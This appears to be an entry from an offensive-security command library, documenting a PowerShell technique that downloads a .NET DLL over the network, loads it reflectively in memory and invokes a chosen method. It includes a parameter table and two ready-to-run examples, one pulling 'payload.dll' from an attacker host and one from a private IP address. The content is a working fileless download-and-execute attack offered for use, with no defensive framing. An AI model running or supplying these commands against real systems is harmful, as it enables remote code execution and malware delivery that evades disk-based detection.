---
id: 16db3764-6477-4c3f-8cfc-72182ec34e5f
name: powershell-execute-specific-method-from-assembly
type: command
executor: powershell
data: |-
  $data = (New-Object System.Net.WebClient).DownloadData('$_DLL_URL')
  $assem = [System.Reflection.Assembly]::Load($data)
  $class = $assem.GetType("$_NAMESPACE.$_CLASS_NAME")
  $method = $class.GetMethod("$_METHOD_NAME")
  $method.Invoke($_INSTANCE, $null)
output: null
created_at: '2023-04-06T03:56:24.082129+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - reflective-loading
  - powershell
  - dll-injection
verified: true
validated: true
---

# powershell-execute-specific-method-from-assembly

## Command

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('$_DLL_URL')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("$_NAMESPACE.$_CLASS_NAME")
$method = $class.GetMethod("$_METHOD_NAME")
$method.Invoke($_INSTANCE, $null)
```

## Description

This PowerShell command downloads a .NET DLL, loads it reflectively, retrieves a specific class and method via reflection, and invokes the method. Use for executing targeted functions in library assemblies without full program entry points.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DLL_URL | URL to the .NET DLL file | Yes |
| $_NAMESPACE | Namespace of the target class | Yes |
| $_CLASS_NAME | Full class name (e.g., ClassLibrary1.Class1) | Yes |
| $_METHOD_NAME | Name of the method to invoke (e.g., runner) | Yes |
| $_INSTANCE | Instance for invocation (0 for static, null for instance) | Yes |

## Examples

### Basic Usage

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://attacker.com/payload.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("Payload.Class1")
$method = $class.GetMethod("Execute")
$method.Invoke(0, $null)
```

### Advanced Usage

For a custom runner method:

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

## Expected Output

Output from the invoked method, such as process creation, network connections, or custom logs. Errors appear as reflection exceptions if class/method not found.

## Related

- [[procedures/Reflective-Assembly-Loading-with-PowerShell]]
- [[commands/powershell-download-and-run-assembly-without-arguments]]
